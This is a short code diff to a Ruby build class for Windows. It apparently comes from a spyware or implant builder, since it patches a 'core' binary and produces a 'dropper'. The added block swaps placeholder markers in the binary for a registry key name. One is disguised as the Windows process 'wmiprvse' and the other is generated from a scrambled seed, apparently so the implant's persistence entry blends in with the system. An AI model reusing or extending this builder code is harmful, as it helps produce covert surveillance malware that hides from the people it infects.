@@ -58,6 +58,21 @@ class BuildWindows < Build
       end
     end
 
+    # patching for the registry key name
+    patch_file(:file => 'core') do |content|
+      begin
+        # the new registry key
+        content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', 'wmiprvse'.ljust(38, "\x00")
+        # and the old one (previous method)
+        core = scramble_name(@factory.seed, 3)
+        dir = scramble_name(core[0..7], 7)
+        reg = '*' + scramble_name(dir, 1)[1..-1]
+        content.binary_patch 'IaspdPDuFMfnm_apggLLL712j', reg.ljust(25, "\x00")
+      rescue
+        raise "Registry key marker not found"
+      end
+    end
+
     # we have an exception here, the core64 must be patched only with the signature and function name
 
     # patching for the function name
@@ -184,7 +199,7 @@ class BuildWindows < Build
                                           executable + ' ' +
                                           path('output')
     end
-    
+
     File.exist? path('output') || raise("output file not created")
 
     trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"
